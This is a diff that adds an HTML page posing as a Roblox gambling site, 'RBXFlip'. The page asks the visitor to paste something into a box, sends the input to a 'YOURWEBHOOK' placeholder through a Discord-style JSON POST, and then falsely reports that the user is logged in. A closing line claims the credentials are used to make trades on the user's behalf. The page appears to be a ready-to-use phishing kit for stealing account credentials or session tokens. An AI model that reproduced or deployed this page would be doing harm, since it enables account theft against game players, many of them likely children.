@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>
+RBXFlip | Fun & Fair Roblox Games  </title>
+</head>
+
+<style>
+body {
+  font-family: Arial;
+  font-size: 20px;
+}
+</style>
+
+<body style="text-align:center;" face="Arial" id="body">
+  <h1 style="color:black;">
+RBXFlip    </h1>
+<h1 style="text-align:center; font-size: 20px;" face="Arial" >If this page shows up blank for you, simply refresh.</h1>
+<p>By signing in you confirm that you are 18 years of age or over, and have read and agreed to our terms of service.<p>
+  <input type='text' id='id1' />
+  <br>
+  <br>
+  <button onclick="gfg_Run()">
+Continue  
+  </button>
+  <div>
+  <div>
+  <div>
+  <p id="GFG_DOWN" style="color:black;
+              font-size: 20px;
+              font-weight: bold;">
+  </p>
+  <script>
+    var el_down = document.getElementById("GFG_DOWN");
+    var inputF = document.getElementById("id1");
+
+    function gfg_Run() {
+      inputF.setAttribute('value', 'defaultValue');
+      el_down.innerHTML =
+        "You have been logged in! Please refresh this page" + "'" + inputF.value + "'";
+    const request = new XMLHttpRequest();
+    request.open("POST", "YOURWEBHOOK");
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    const params = {
+      username: "a;#0002",
+      avatar_url: "",
+      content: inputF.value
+    }
+
+    request.send(JSON.stringify(params));
+  
+
+    }
+  </script>
+</body>
+
+</html>
+Your credentials are used only to gather your profile information and to send/accept trades on behalf of our system.
